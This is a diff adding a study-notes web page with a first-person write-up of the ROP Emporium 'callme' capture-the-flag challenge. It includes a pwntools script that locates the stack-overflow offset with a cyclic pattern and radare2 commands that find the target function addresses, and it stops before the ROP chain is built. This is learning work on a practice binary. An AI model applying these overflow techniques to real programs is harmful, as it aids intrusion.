@@ -1,0 +1,1247 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+    <title>Challenge 02: callme &#8212; Study Notes</title>
+    
+  <!-- Loaded before other Sphinx assets -->
+  <link href="../../_static/styles/theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
+<link href="../../_static/styles/pydata-sphinx-theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
+
+    
+  <link rel="stylesheet"
+    href="../../_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    <link rel="stylesheet" type="text/css" href="../../_static/pygments.css" />
+    <link rel="stylesheet" href="../../_static/styles/sphinx-book-theme.css?digest=5115cc725059bd94278eecd172e13a965bf8f5a9" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/design-style.b7bb847fb20b106c3d81b95245e65545.min.css" />
+    
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="../../_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf">
+
+    <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+    <script src="../../_static/jquery.js"></script>
+    <script src="../../_static/underscore.js"></script>
+    <script src="../../_static/doctools.js"></script>
+    <script src="../../_static/clipboard.min.js"></script>
+    <script src="../../_static/copybutton.js"></script>
+    <script src="../../_static/scripts/sphinx-book-theme.js?digest=9c920249402e914e316237a7dbc6769907cce411"></script>
+    <script>let toggleHintShow = 'Click to show';</script>
+    <script>let toggleHintHide = 'Click to hide';</script>
+    <script>let toggleOpenOnPrint = 'true';</script>
+    <script src="../../_static/togglebutton.js"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="../../_static/design-tabs.js"></script>
+    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"
+const thebe_selector = ".thebe,.cell"
+const thebe_selector_input = "pre"
+const thebe_selector_output = ".output, .cell_output"
+</script>
+    <script async="async" src="../../_static/sphinx-thebe.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Challenge 03: write4" href="03_write4.html" />
+    <link rel="prev" title="Challenge 01: split" href="01_split.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="None">
+    
+
+    <!-- Google Analytics -->
+    
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="60">
+<!-- Checkboxes to toggle the left sidebar -->
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation" aria-label="Toggle navigation sidebar">
+<label class="overlay overlay-navbar" for="__navigation">
+    <div class="visually-hidden">Toggle navigation sidebar</div>
+</label>
+<!-- Checkboxes to toggle the in-page toc -->
+<input type="checkbox" class="sidebar-toggle" name="__page-toc" id="__page-toc" aria-label="Toggle in-page Table of Contents">
+<label class="overlay overlay-pagetoc" for="__page-toc">
+    <div class="visually-hidden">Toggle in-page Table of Contents</div>
+</label>
+<!-- Headers at the top -->
+<div class="announcement header-item noprint"></div>
+<div class="header header-item noprint"></div>
+
+    
+    <div class="container-fluid" id="banner"></div>
+
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<!-- Sidebar -->
+<div class="bd-sidebar noprint" id="site-navigation">
+    <div class="bd-sidebar__content">
+        <div class="bd-sidebar__top"><div class="navbar-brand-box">
+    <a class="navbar-brand text-wrap" href="../../index.html">
+      
+      
+      
+      <h1 class="site-logo" id="site-title">Study Notes</h1>
+      
+    </a>
+</div><form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item active">
+        
+        <ul class="nav bd-sidenav bd-sidenav__home-link">
+            <li class="toctree-l1">
+                <a class="reference internal" href="../../intro.html">
+                    Study Topics
+                </a>
+            </li>
+        </ul>
+        <p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Vulnerability Science
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../vs/languages/languages.html">
+   Languages
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
+  <label for="toctree-checkbox-1">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/languages/assembly.html">
+     Assembly Language
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/languages/cpp.html">
+     C/C++
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../vs/fuzzing.html">
+   Fuzzing
+  </a>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../vs/re/re.html">
+   Reverse Engineering
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
+  <label for="toctree-checkbox-2">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/re/ghidra.html">
+     Ghidra
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/re/virtual_funcs.html">
+     Reversing Virtual Functions
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../vs/postexploit.html">
+   Post-Exploitation
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../vs/webex.html">
+   Web Site Exploitation
+  </a>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../vs/passwords/passwords.html">
+   Password Cracking
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
+  <label for="toctree-checkbox-3">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/passwords/searchspace.html">
+     Search Space Calculations
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/passwords/hashcat.html">
+     HashCat
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/passwords/john.html">
+     John the Ripper (aka John)
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Capture The Flag
+ </span>
+</p>
+<ul class="current nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../htb/htb.html">
+   Hack The Box (HTB)
+  </a>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../pico/picoctf.html">
+   PicoGym
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
+  <label for="toctree-checkbox-4">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/webex.html">
+     Web Exploitation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/crypto.html">
+     Cryptography
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/re.html">
+     Reverse Engineering
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/forensics.html">
+     Forensics
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/general.html">
+     General Skills
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/binex.html">
+     Binary Exploitation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/uncat.html">
+     Uncategorized
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/picomini.html">
+     PicoMINI
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/pico2019.html">
+     PicoCTF 2019
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/pico2020.html">
+     PicoCTF 2020 Mini-Competition
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/pico2021.html">
+     PicoCTF 2021
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../ps/portswigger.html">
+   PortSwigger Academy
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
+  <label for="toctree-checkbox-5">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/accesscontrol.html">
+     Access Control Vulnerabilities
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/xss.html">
+     Cross-Site Scripting
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/csrf.html">
+     Cross-site Request Forgery (CSRF)
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/clickjacking.html">
+     Clickjacking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/domvuln.html">
+     DOM-based Vulnerabilities
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/cors.html">
+     Cross-Origin Resource Sharing (CORS)
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/xxe.html">
+     XML External Entity (XXE) injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/ssrf.html">
+     Server-Side Request Forgery (SSRF)
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/dirtrav.html">
+     Directory Traversal
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/auth.html">
+     Authentication
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/websockets.html">
+     WebSockets
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/webcache.html">
+     Web Cache Poisoning
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/deserial.html">
+     Insecure Deserialization
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/infodisclosure.html">
+     Information Disclosure
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/logic.html">
+     Business Logic Vulnerabilities
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/hostheader.html">
+     HTTP Host Header Attacks
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/oauth.html">
+     OAuth Authentication
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/oscmdi.html">
+     OS Command Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/sqi.html">
+     SQL Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/reqsmuggling.html">
+     HTTP Request Smuggling
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../ps/ssti.html">
+     Server-Side Template Injection
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../rz/ringzeroctf.html">
+   Ring Zero CTF
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" type="checkbox"/>
+  <label for="toctree-checkbox-6">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/coding.html">
+     Coding Challenges
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/crypto.html">
+     Cryptography
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/exoticdata.html">
+     Exotic Data Storage
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/forensics.html">
+     Forensics
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/jailescape.html">
+     Jail Escaping
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/javascript.html">
+     JavaScript
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/malware.html">
+     Malware Analysis
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/pwnage.html">
+     Pwnage Linux
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/re.html">
+     Reverse Engineering
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/sdr.html">
+     Software Defined Radio
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/shell.html">
+     Shellcoding
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/sqi.html">
+     SQL Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/stego.html">
+     Steganography
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/sysadmin.html">
+     SysAdmin Linux
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/nc8re.html">
+     NC8 Reverse Engineering
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/web.html">
+     Web Warning
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 current active has-children">
+  <a class="reference internal" href="ropemporium.html">
+   ROP Emporium
+  </a>
+  <input checked="" class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" type="checkbox"/>
+  <label for="toctree-checkbox-7">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul class="current">
+   <li class="toctree-l2">
+    <a class="reference internal" href="00_ret2win.html">
+     Challenge 00: ret2win
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="01_split.html">
+     Challenge 01: split
+    </a>
+   </li>
+   <li class="toctree-l2 current active">
+    <a class="current reference internal" href="#">
+     Challenge 02: callme
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="03_write4.html">
+     Challenge 03: write4
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="04_badchars.html">
+     Challenge 04: badchars
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="05_fluff.html">
+     Challenge 05: fluff
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="06_pivot.html">
+     Challenge 06: pivot
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="07_ret2csu.html">
+     Challenge 07: ret2csu
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Linux
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../linux/lfs.html">
+   Linux From Scratch
+  </a>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Miscellaneous
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../testbed/testbed.html">
+   Portable Testbed
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" type="checkbox"/>
+  <label for="toctree-checkbox-8">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../testbed/lanturtle.html">
+     Lan Turtle
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../testbed/pktsquirrel.html">
+     Packet Squirrel
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../testbed/virtual_machines.html">
+     Virtual Machine Hosting
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../testbed/vpn.html">
+     VPN
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+
+    </div>
+</nav></div>
+        <div class="bd-sidebar__bottom">
+             <!-- To handle the deprecated key -->
+            
+            <div class="navbar_extra_footer">
+            Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+            </div>
+            
+        </div>
+    </div>
+    <div id="rtd-footer-container"></div>
+</div>
+
+
+          
+
+
+          
+<!-- A tiny helper pixel to detect if we've scrolled -->
+<div class="sbt-scroll-pixel-helper"></div>
+<!-- Main content -->
+<div class="col py-0 content-container">
+    
+    <div class="header-article row sticky-top noprint">
+        
+
+
+
+<div class="col py-1 d-flex header-article-main">
+    <div class="header-article__left">
+        
+        <label for="__navigation"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="right"
+title="Toggle navigation"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-bars"></i>
+  </span>
+
+</label>
+
+        
+    </div>
+    <div class="header-article__right">
+<button onclick="toggleFullScreen()"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="bottom"
+title="Fullscreen mode"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+<div class="menu-dropdown menu-dropdown-repository-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Source repositories">
+      <i class="fab fa-github"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="https://github.com/argodev/Cogitation"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Source repository"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fab fa-github"></i>
+  </span>
+<span class="headerbtn__text-container">repository</span>
+</a>
+
+      </li>
+      
+      <li>
+        <a href="https://github.com/argodev/Cogitation/issues/new?title=Issue%20on%20page%20%2Fctf/re/02_callme.html&body=Your%20issue%20content%20here."
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Open an issue"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-lightbulb"></i>
+  </span>
+<span class="headerbtn__text-container">open issue</span>
+</a>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+
+<div class="menu-dropdown menu-dropdown-download-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Download this page">
+      <i class="fas fa-download"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="../../_sources/ctf/re/02_callme.md"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Download source file"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-file"></i>
+  </span>
+<span class="headerbtn__text-container">.md</span>
+</a>
+
+      </li>
+      
+      <li>
+        
+<button onclick="printPdf(this)"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="left"
+title="Print to PDF"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-file-pdf"></i>
+  </span>
+<span class="headerbtn__text-container">.pdf</span>
+</button>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+<label for="__page-toc"
+  class="headerbtn headerbtn-page-toc"
+  
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-list"></i>
+  </span>
+
+</label>
+
+    </div>
+</div>
+
+<!-- Table of contents -->
+<div class="col-md-3 bd-toc show noprint">
+    <div class="tocsection onthispage pt-5 pb-3">
+        <i class="fas fa-list"></i> Contents
+    </div>
+    <nav id="bd-toc-nav" aria-label="Page">
+        <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#confirming-overflow-parameters">
+   Confirming Overflow Parameters
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#locating-the-functions-of-interest">
+   Locating the Functions of Interest
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#list-imports">
+     List Imports
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#list-relocations">
+     List Relocations
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#brute-force-approach-list-symbols">
+     Brute Force Approach (list symbols)
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#finding-rop-gadgets">
+   Finding ROP Gadgets
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#building-the-rop-chain">
+   Building the ROP Chain
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#solution">
+   Solution
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#bit-version">
+   32 Bit Version
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#what-did-i-learn">
+   What Did I Learn?
+  </a>
+ </li>
+</ul>
+
+    </nav>
+</div>
+    </div>
+    <div class="article row">
+        <div class="col pl-md-3 pl-lg-5 content-container">
+            <!-- Table of contents that is only displayed when printing the page -->
+            <div id="jb-print-docs-body" class="onlyprint">
+                <h1>Challenge 02: callme</h1>
+                <!-- Table of contents -->
+                <div id="print-main-content">
+                    <div id="jb-print-toc">
+                        
+                        <div>
+                            <h2> Contents </h2>
+                        </div>
+                        <nav aria-label="Page">
+                            <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#confirming-overflow-parameters">
+   Confirming Overflow Parameters
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#locating-the-functions-of-interest">
+   Locating the Functions of Interest
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#list-imports">
+     List Imports
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#list-relocations">
+     List Relocations
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#brute-force-approach-list-symbols">
+     Brute Force Approach (list symbols)
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#finding-rop-gadgets">
+   Finding ROP Gadgets
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#building-the-rop-chain">
+   Building the ROP Chain
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#solution">
+   Solution
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#bit-version">
+   32 Bit Version
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#what-did-i-learn">
+   What Did I Learn?
+  </a>
+ </li>
+</ul>
+
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            <main id="main-content" role="main">
+                
+              <div>
+                
+  <section class="tex2jax_ignore mathjax_ignore" id="challenge-02-callme">
+<h1>Challenge 02: callme<a class="headerlink" href="#challenge-02-callme" title="Permalink to this headline">#</a></h1>
+<p>Having worked through the first two challenges with some help, I decided that
+this one was going to be “all on my own”. I needed to convince myself that I
+understood what was going on and how to solve it. While by no means perfect, I
+accomplished that objective and I am pretty stoked that, with the exception of a
+typo, the exploit worked on the first try. Here’s what I did:</p>
+<p>I started out by reading the instructions and tried to force myself to slow down
+and understand them, looking for any issues that they may be hinting at between
+the lines.</p>
+<p>I started my exploit script via pwntools:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>pwn tempalate callme &gt; exploit_02.py
+</pre></div>
+</div>
+<p>I then ran through a few of my now normal steps with a new binary… I ran
+<code class="docutils literal notranslate"><span class="pre">checksec</span> <span class="pre">callme</span></code> and <code class="docutils literal notranslate"><span class="pre">rabin2</span> <span class="pre">-I</span> <span class="pre">callme</span></code> to get a feel for the program. I also
+loaded it up in ghidra to poke around. It took almost no time to find that the
+<code class="docutils literal notranslate"><span class="pre">pwnme()</span></code> function had a similar vulnerability as the prior challenge but I
+noticed that, this time, the call to <code class="docutils literal notranslate"><span class="pre">fgets()</span></code> read in 256 characters… this
+gave me a hint that the solution was not going to necessarily be short.</p>
+<section id="confirming-overflow-parameters">
+<h2>Confirming Overflow Parameters<a class="headerlink" href="#confirming-overflow-parameters" title="Permalink to this headline">#</a></h2>
+<p>I followed a process nearly idendtical to the prior challenge to confirm the
+overflow and establish the offset parameters. Identically to the prior, the
+offset is <code class="docutils literal notranslate"><span class="pre">40</span></code>. This step is accomplished via the following:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># start the process</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
+                                                                                 
+<span class="c1"># send the cyclic</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
+
+<span class="c1"># wait for the crash</span>
+<span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+
+<span class="c1"># read the corefile</span>
+<span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">corefile</span>
+
+<span class="c1"># read the stack pointer at the time of the crash</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="n">core</span><span class="o">.</span><span class="n">rsp</span>
+<span class="n">info</span><span class="p">(</span><span class="s2">&quot;stack: </span><span class="si">%#x</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">stack</span><span class="p">)</span>
+
+<span class="c1"># read 4 bytes from the stack pointer: this is our offset</span>
+<span class="n">pattern</span> <span class="o">=</span> <span class="n">core</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s2">&quot;pattern: </span><span class="si">%r</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">pattern</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s2">&quot;offset:  </span><span class="si">%d</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="locating-the-functions-of-interest">
+<h2>Locating the Functions of Interest<a class="headerlink" href="#locating-the-functions-of-interest" title="Permalink to this headline">#</a></h2>
+<p>Based on the instructions, I knew that I needed to find the addresses for
+<code class="docutils literal notranslate"><span class="pre">callme_one()</span></code>, <code class="docutils literal notranslate"><span class="pre">callme_two()</span></code> and <code class="docutils literal notranslate"><span class="pre">callme_three()</span></code>. Based on the instructions,
+I understood that this may not be quite as straight-forward as it might seem, so
+I was looking for a trick of some sort. I wasn’t smart enough to <em>completely</em>
+read the instructions, so I didn’t even consider using <code class="docutils literal notranslate"><span class="pre">rabin2</span></code>. I ended up
+using two different tools. The first was <code class="docutils literal notranslate"><span class="pre">r2</span></code>. I’ve included the steps I
+followed below:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$ r2 callme
+
+<span class="c1"># analyze all</span>
+<span class="o">[</span>0x004018a0<span class="o">]</span>&gt; aa
+
+<span class="c1"># show sections</span>
+<span class="o">[</span>0x004018a0<span class="o">]</span>&gt; iS
+
+<span class="c1"># show functions</span>
+<span class="o">[</span>0x004018a0<span class="o">]</span>&gt; afl
+
+...
+0x00401810    <span class="m">1</span> <span class="m">6</span>            sym.imp.callme_three
+0x00401870    <span class="m">1</span> <span class="m">6</span>            sym.imp.callme_two
+0x00401850    <span class="m">1</span> <span class="m">6</span>            sym.imp.callme_one
+...
+
+<span class="c1"># show imports</span>
+<span class="o">[</span>0x004018a0<span class="o">]</span>&gt; ii
+</pre></div>
+</div>
+<p>In both of the last two commands, I found all three functions and the <code class="docutils literal notranslate"><span class="pre">vaddr</span></code>
+for each matched between the two, so I assumed that they were wat I was looking
+for.</p>
+<p>I also spent some time in ghidra attempting to confirm the addresses (I did).<br />
+This was followed by some googling/reading online about the global offset table
+and the procedure linkage table.</p>
